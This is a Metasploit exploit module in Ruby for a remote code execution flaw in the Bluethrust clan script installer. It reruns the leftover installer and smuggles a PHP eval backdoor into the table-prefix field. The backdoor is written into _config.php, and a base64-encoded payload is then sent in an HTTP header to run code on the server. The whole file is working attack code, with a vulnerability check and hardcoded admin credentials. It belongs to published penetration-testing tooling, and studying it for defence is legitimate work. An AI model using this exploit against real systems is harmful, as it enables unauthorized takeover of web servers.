#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Bluethrust Install PHP Code Injection',
      'Description'    => %q{
        This module exploits a installation processes of Bluethrust. Application does not force
        users to delete install folder after installation done. So code injection can be done via
        reinstall application. Tested working on Ubuntu 13.10, Apache and Mysql.
      },
      'Author'         =>
        [
          'Mehmet Ince <mehmet@mehmetince.net>', # Vulnerability Author and Exploit Development
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.mehmetince.net/bluethrustclanscript-remote-code-execution-exploit/' ],
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets'        => [ ['Bluethrust', { }], ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 16 2014'
      ))

      register_options(
        [
          OptString.new('TARGETURI', [ true, "The Path", "/"]),
          OptString.new('DB_SERVER', [ true, "MySQL server address"]),
          OptString.new('DB_USERNAME', [ true, "MySQL username"]),
          OptString.new('DB_PASSWORD', [ true, "MySQL password"]),
          OptString.new('DB_DATABASE', [ true, "MySQL name of database", "bluethrust_db"]),

        ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path.to_s, "installer/index.php"),
      'method'  => 'GET'
    })
    if res.code == 200 and res.body =~ /Database Name/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def checkout_installation(res)
    # If webpage returns error, it highly possible with wrong DBS credentials
    if res.body =~ /Config File Created!/
      print_status("#{peer} - Installation is done!")
    else
      fail_with(Failure::Unknown, "Please check out DB credentials. Also be sure remote connection is available!")
    end
  end

  def exploit
    print_status("#{peer} - Testing Exploit")
    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, "#{peer} - Target isn't vulnerable.")
    end
    print_status("#{peer} - Triggering Vulnerability")
    table_prefix = rand_text_alpha(rand(10)+5)
    res = send_request_cgi({
          'uri'     =>  normalize_uri(target_uri.path.to_s, "installer/index.php?step=3"),
          'method'  =>  'POST',
          'vars_post'=>  {
            'dbhost'                =>  @datastore['DB_SERVER'],
            'dbuser'                =>  @datastore['DB_USERNAME'],
            'dbpass'                =>  @datastore['DB_PASSWORD'],
            'dbname'                =>  @datastore['DB_DATABASE'],
            'tableprefix'           =>  table_prefix,
            'installType'           =>  '1',
            'adminusername'         =>  'admin',
            'adminpassword'         =>  '1337l33t',
            'adminpassword_repeat'  =>  '1337l33t',
            'adminkey'              =>  '13371337',
            'adminkey_repeat'       =>  '13371337',
            'step2submit'           =>  'Go+to+Step+3null'
          }
        })
    print_status("#{peer} - Selected prefix : #{table_prefix}")
    checkout_installation(res)
    # Second request in order to inject php codes to _config.php file. Further info : References -> URL
    print_status("#{peer} - Sending second installation request...")
    res = send_request_cgi({
          'uri'     =>  normalize_uri(target_uri.path.to_s, "installer/index.php?step=3"),
          'method'  =>  'POST',
          'vars_post'=>  {
            'dbhost'                =>  @datastore['DB_SERVER'],
            'dbuser'                =>  @datastore['DB_USERNAME'],
            'dbpass'                =>  @datastore['DB_PASSWORD'],
            'dbname'                =>  @datastore['DB_DATABASE'],
            'tableprefix'           =>  table_prefix+'";eval(base64_decode($_SERVER[HTTP_RCE]));#',
            'installType'           =>  '1',
            'adminusername'         =>  'admin',
            'adminpassword'         =>  '1337l33t',
            'adminpassword_repeat'  =>  '1337l33t',
            'adminkey'              =>  '13371337',
            'adminkey_repeat'       =>  '13371337',
            'step2submit'           =>  'Go+to+Step+3null'
          }
        })

    checkout_installation(res)
    # It's time to call _config.php file to code execution.
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri(target_uri.path.to_s, "_config.php"),
      'headers'   => {
        'Rce' => Rex::Text.encode_base64(payload.encoded)
      }
    })
  end
end
